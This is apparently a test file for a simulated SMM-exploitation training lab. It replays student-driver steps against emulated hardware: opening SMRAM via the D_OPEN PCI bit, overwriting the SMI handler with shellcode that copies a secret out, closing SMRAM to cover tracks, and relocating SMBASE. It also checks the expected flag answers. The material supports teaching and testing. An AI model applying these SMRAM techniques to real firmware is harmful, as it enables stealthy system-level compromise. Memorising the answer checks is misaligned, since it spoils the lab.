/**
 * SMM track labs, headless: boot the smm-* scenario worlds and replay the
 * exact machine effects a compiled student driver produces (port writes +
 * SMRAM patches), then verify the flag answers fall out deterministically.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { StructTables } from "@kernelforge/ntsim/src/structs.mjs";
import { KdEngine } from "../../../packages/windbg-web/src/engine.mjs";
import {
  getScenario, SMM_LANDING_VA, SMM_LANDING2_VA,
} from "../src/scenarios.js";
import { SAVE_STATE, PORT_APMC, PORT_CF8, PORT_CFC, DEFAULT_SMBASE } from "@kernelforge/ntsim/src/index.mjs";

const tablesDir = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
  "../../../packages/ntsim-assets/data/vergilius/windows-10/22h2",
);

const io = {
  makeBackend: async () => { throw new Error("smm worlds run JsInterpreter"); },
  loadTables: () => StructTables.loadDir(tablesDir, ["_EPROCESS", "_KPROCESS", "_ETHREAD"]),
};

function pciWriteByte(kernel, cfgReg, byteValue) {
  kernel.cpu.onPortWrite(PORT_CF8, BigInt(0x80000000 | cfgReg), 4);
  kernel.cpu.onPortWrite(PORT_CFC, BigInt(byteValue), 1);
}

const hex = (bytes) => [...bytes].map((b) => b.toString(16).padStart(2, "0")).join(" ");
const asciiOf = (bytes) => [...bytes].map((b) => (b >= 0x20 && b < 0x7f ? String.fromCharCode(b) : ".")).join("");

function imm64(v) { const o = []; let x = BigInt(v); for (let i = 0; i < 8; i++) { o.push(Number(x & 0xffn)); x >>= 8n; } return o; }
function imm32(v) { const n = Number(BigInt.asUintN(32, BigInt(v))); return [n & 0xff, (n >>> 8) & 0xff, (n >>> 16) & 0xff, (n >>> 24) & 0xff]; }

/** Dispatch pending SMIs the way apps/web/src/main.js does post-DriverEntry. */
async function dispatchPending(kernel, max = 2) {
  const smm = kernel.smm;
  const statuses = [];
  let guard = 0;
  while (smm.smiPending && guard++ < max) {
    const r = smm.smiDispatch();
    statuses.push(r.status);
  }
  return statuses;
}

test("m11.l1: paged world answers all three flag questions", async () => {
  const session = await getScenario("smm-foundations").boot(io);
  const k = session.kernel;
  assert.equal(k.paging, true);

  // f1: physical address of the KUSER kernel alias
  assert.equal(k.vtop(0xfffff78000000000n), 0x10d000n);

  // f2: process count
  assert.equal([...k.processesByName.values()].length, 7);

  // f3: KUSER is NX
  const kd = new KdEngine(k);
  assert.match(kd.execute("!pte 0x7ffe0000"), /NX/);
});

test("m12.l1: vault chain exfiltrates the secret into the landing page", async () => {
  const session = await getScenario("smm-vault").boot(io);
  const k = session.kernel;
  const cs = k.cs;
  const secretVa = DEFAULT_SMBASE + 0x1000n;

  // hidden pre-exploit
  assert.throws(() => k.mem.readUtf16(secretVa, 8), /page fault/);

  // ---- student driver effect #1: open the vault
  pciWriteByte(k, 0x9c, 0x09); // D_OPEN | G_SMRAME
  assert.equal(cs.dOpen, true);

  // ---- effect #2: overwrite the SMI handler (movabs rsi/rdi + rep movsb)
  const handler = [
    0x48, 0xbe, ...imm64(secretVa),          // movabs rsi, SECRET_VA
    0x48, 0xbf, ...imm64(SMM_LANDING_VA),    // movabs rdi, LANDING
    0xb9, 0x10, 0x00, 0x00, 0x00,            // mov ecx, 16
    0xf3, 0xa4,                              // rep movsb
    0xc3,
  ];
  k.mem.write(DEFAULT_SMBASE + 0x8000n, new Uint8Array(handler));

  // ---- effect #3: close to cover tracks
  pciWriteByte(k, 0x9c, 0x01);
  assert.throws(() => k.mem.readUtf16(secretVa, 8), /page fault/);

  // ---- effect #4: latch the SMI (outbyte(APMC_PORT, 1))
  k.cpu.onPortWrite(PORT_APMC, 0x01n, 1);

  const statuses = await dispatchPending(k);
  assert.deepEqual(statuses, ["ok"]);

  const landing = k.mem.read(SMM_LANDING_VA, 16);
  assert.match(asciiOf(landing), /KFSMM-EXFIL-2026/);

  // f2 follow-up: lock the door, D_OPEN must refuse
  pciWriteByte(k, 0x9c, 0x03); // D_LCK | G_SMRAME
  pciWriteByte(k, 0x9c, 0x09); // try to reopen — ignored
  assert.equal(cs.dOpen, false);
});

test("m13.l1: save-state SMBASE rewrite relocates the next SMI", async () => {
  const session = await getScenario("smm-reloc").boot(io);
  const k = session.kernel;
  const OLD_BASE = DEFAULT_SMBASE;
  const NEW_BASE = 0x7e400000n;

  // open, plant relocated stub, patch old handler to relocate on exit, close
  pciWriteByte(k, 0x9c, 0x09);

  // stub @ NEW_BASE+0x8000: stamp 'MF2K' into landing2
  const stub = [
    0x48, 0xb8, ...imm64(SMM_LANDING2_VA),   // movabs rax, LANDING2
    0xc7, 0x00, 0x4d, 0x32, 0x46, 0x4b,      // mov dword [rax], 'MF2K'
    0xc3,
  ];
  k.mem.write(NEW_BASE + 0x8000n, new Uint8Array(stub));

  // old handler: mov dword [OLD_BASE+0xFB04], NEW_BASE ; ret (C7 05 rel32 imm32)
  const target = OLD_BASE + SAVE_STATE.SMBASE;
  const afterInstr = OLD_BASE + 0x8000n + 10n; // len(C7 05 rel32 imm32) = 10
  const rel = Number(BigInt.asIntN(32, target - afterInstr));
  const oldPatch = [
    0xc7, 0x05, ...imm32(rel), ...imm32(NEW_BASE),
    0xc3,
  ];
  k.mem.write(OLD_BASE + 0x8000n, new Uint8Array(oldPatch));
  pciWriteByte(k, 0x9c, 0x01);

  // SMI #1: enters at OLD base, handler relocates, RSM sticks it
  k.cs.smiPending = true;
  let entry = k.smm.smiEnter();
  assert.equal(entry, OLD_BASE + 0x8000n);
  assert.equal(k.cpu.callFunction(entry, []).status, "ok");
  k.smm.smiExit();
  assert.equal(k.smm.currentSmbase, NEW_BASE);
  assert.equal(k.smm.stats.relocated, 1);

  // SMI #2: enters the planted stub
  k.cs.smiPending = true;
  entry = k.smm.smiEnter();
  assert.equal(entry, NEW_BASE + 0x8000n);
  assert.equal(k.cpu.callFunction(entry, []).status, "ok");
  k.smm.smiExit();

  const magic = k.mem.u32(SMM_LANDING2_VA);
  assert.equal(BigInt(magic), 0x4b46324dn); // "MF2K"
});
